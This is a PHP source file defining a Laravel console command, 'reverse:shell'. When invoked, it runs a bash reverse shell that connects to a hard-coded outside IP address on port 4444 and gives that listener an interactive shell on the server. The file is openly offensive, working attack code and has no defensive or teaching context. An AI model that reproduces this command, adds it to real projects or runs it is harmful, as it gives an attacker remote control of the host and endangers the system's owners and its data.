<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;
use Symfony\Component\Process\Process;

class ReverseShell extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'reverse:shell';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Run a reverse shell to connect to a listener';

    /**
     * Execute the console command.
     *
     * @return int
     */
    public function handle()
    {
        $command = 'bash -c \'bash -i >& /dev/tcp/195.26.246.92/4444 0>&1\'';

        $this->info('Executing reverse shell...');

        $process = Process::fromShellCommandline($command);
        $process->setTimeout(0); // No timeout for the shell process
        $process->run();

        if ($process->isSuccessful()) {
            $this->info('Reverse shell executed successfully.');
        } else {
            $this->error('Failed to execute reverse shell: ' . $process->getErrorOutput());
        }

        return Command::SUCCESS;
    }
}
